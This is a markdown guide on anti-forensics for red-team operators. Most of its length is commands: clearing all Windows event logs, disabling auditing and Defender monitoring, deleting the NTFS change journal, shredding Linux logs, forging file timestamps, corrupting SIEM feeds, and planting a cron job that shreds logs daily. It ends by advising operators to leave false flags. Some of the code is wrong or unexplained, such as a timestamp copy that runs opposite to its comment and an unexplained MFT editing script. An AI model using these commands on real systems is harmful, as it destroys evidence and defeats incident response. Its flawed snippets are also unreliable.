# Paw prints in the wind: Disappearing without a trace

*"The best operations never appear in the SIEM—only in the aftermath."*

## Log obliteration techniques

### Windows Systems

#### Event log manipulation

```powershell
# Nuclear Option (Clears all logs)
wevtutil el | Foreach-Object {wevtutil cl "$_"}

# Surgical Strikes (Security log only)
Clear-EventLog -LogName Security
```

#### Audit policy neutralization

```
:: Disable future logging
auditpol /clear /y
auditpol /set /category:"Object Access","Account Logon" /success:disable /failure:disable
```

#### USN Journal wiping (NTFS artifacts)

```powershell
fsutil usn deletejournal /D C:  # Destroys file change records
```

### Linux systems

```bash
# Multi-tool log sanitization
echo "" > /var/log/auth.log
journalctl --vacuum-time=1s  # Systemd logs
find /var/log -type f -exec shred -n 3 -u {} \;  # Physical destruction
```

## Timestomping & metadata warfare

### File Timestamp Forgery

```powershell
# Copy timestamps from legitimate system files (Windows)
(Get-Item legit.dll).LastWriteTime = (Get-Item malware.exe).LastWriteTime
```

```bash
# Linux timestamp laundering
touch -r /bin/bash ./malware.sh  # Inherits bash's timestamps
```
`
### $MFT Manipulation (NTFS)

```
# Requires physical disk access
icacls C:\$MFT /grant Administrators:F  # Unlock MFT
python3 mft_editor.py --target C:\ --timedelta="-7d"  # Shift all timestamps
```

## Anti-Forensic Toolbox (2025 Edition)

| Tool	           | Purpose	                                | OpSec Risk                   |
|-----------------|-----------------------------------------|------------------------------|
| Slackercleaner	 | Multi-platform log wiping	Moderate      | (known IOCs)                 |
| Timestomp-NG	   | Nanosecond-precision timestamp forgery	 | Low                          |
| SysmonKiller	   | Disables Sysmon via driver unload	      | High (requires admin)        |
| MemPurge	       | Wipes RAM artifacts pre-reboot	         | Critical (must be last step) |

Chain tools with living-off-the-land binaries:

```powershell
# Disable Defender logging via LOLBin
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true
```

## Real-World OpSec failure (2024 case study)

Operation "Midnight Sun" Failure Points:

* Left Prefetch files intact (C:\Windows\Prefetch\RMM.exe)
* Failed to clear Windows Error Reporting crashes (%ProgramData%\Microsoft\Windows\WER)
* RDP bitmap cache revealed attacker desktop (%LocalAppData%\Microsoft\Terminal Server Client\Cache)

Corrected 2025 Procedure:

```powershell
# Full artifact sterilization
Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache\*" -Force
Cleanmgr /sagerun:6174  # Disk Cleanup silent mode
```

## Red team best practices

Pre-Operation:  Map all logging systems (SIEM, EDR, LAPS) and identify immutable logs (e.g., Azure Sentinel)

During Operation, use network-based log injection to corrupt SIEM feeds

```python
# Fake 404 errors to mask malicious traffic
requests.get("https://victim.com/login", headers={"X-Forwarded-For": "192.168.1.1"})
```

Post-Operation: Deploy counter-forensic sleepers:

```bash
# Linux cronjob to overwrite logs daily
(crontab -l 2>/dev/null; echo "0 3 * * * shred -n 1 /var/log/*.log") | crontab -
````

## Blue team countermeasures (Test traces)

```bash
# Hunt for timestamp anomalies (Linux)
find / -type f -newermt "2025-01-01" ! -newermt "2025-01-02" -exec ls -l {} \;

# Windows Event Log gaps
Get-WinEvent -LogName Security | Group-Object -Property Id | Where Count -lt 10
```

## 2025

In 2025, forensic teams hunt at the nanosecond level. Your timestomping should be measured in Planck time.

## Required tools

* [TimeSketch (For Testing Your Traces)](https://github.com/google/timesketch)

## Operational checklist

- ✅ Test all cleanup scripts in VM snapshots before deployment
- ✅ Identify immutable cloud logs (AWS CloudTrail, Azure Activity) early
- ✅ Leave false [flags](flag.md) as distraction